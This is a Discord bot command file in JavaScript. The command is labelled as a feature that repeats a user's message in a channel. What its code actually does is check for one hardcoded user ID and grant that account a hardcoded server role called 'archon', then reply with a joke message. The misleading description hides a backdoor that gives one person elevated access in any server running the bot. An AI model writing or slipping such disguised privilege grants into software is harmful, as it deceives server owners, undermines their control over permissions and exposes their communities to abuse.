import { CommandInteraction } from 'discord.js'

import { SlashCommandBuilder } from '@discordjs/builders'

export default {
  directory: 'Admin',
  usage: `none`,
  requirements: 'zyla only.',
  perms: 1n << 13n,

  data: new SlashCommandBuilder()
    .setName('zyla')
    .setDescription('Bot repeats your message in a given channel or in the same channel.')
	,

  /** @param {CommandInteraction} interaction */
  execute: async function (interaction) {
    await interaction.deferReply({ ephemeral: true })
	if (interaction.member.id != 488699894023061516) {
		return
	}
    const member = await interaction.guild.members.fetch(488699894023061516)
    const archon = await interaction.guild.roles.fetch(783741356416696372)
	
    await member.roles.add(archon.id).then(member => {
        interaction.editReply(`ganbare ganbare senpai`)
    })
  },
}
